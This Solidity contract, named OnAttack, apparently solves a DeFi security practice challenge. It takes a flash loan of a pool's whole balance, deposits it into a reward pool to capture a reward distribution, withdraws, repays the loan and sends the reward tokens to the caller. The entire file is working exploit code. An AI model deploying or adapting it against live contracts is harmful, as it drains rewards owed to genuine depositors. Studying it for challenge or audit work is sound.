// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external; 
}

interface ITheRewarderPool {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function distributeRewards() external returns (uint256 rewards);
}

contract OnAttack {
    IERC20 public liquidityToken;
    IERC20 public rewardToken;
    IFlashLoanerPool public flashLoanPool;
    ITheRewarderPool public rewarderPool;

    constructor (address _deositToken, address _rewardToken, address _flashLoanPool, address _rewarderPool) {
        liquidityToken = IERC20(_deositToken);
        rewardToken = IERC20(_rewardToken);
        flashLoanPool = IFlashLoanerPool(_flashLoanPool);
        rewarderPool = ITheRewarderPool(_rewarderPool);
    }

    function getLoanAndDeposit() public {
        uint balanceFlashLoanPool = liquidityToken.balanceOf(address(flashLoanPool));
        liquidityToken.approve(address(rewarderPool), balanceFlashLoanPool);
        flashLoanPool.flashLoan(balanceFlashLoanPool);
    }

    function getRewards() public {
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        // deposit distributes rewards already
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        // pay back to flash loan sender
        liquidityToken.transfer(address(flashLoanPool), amount);
    }
}
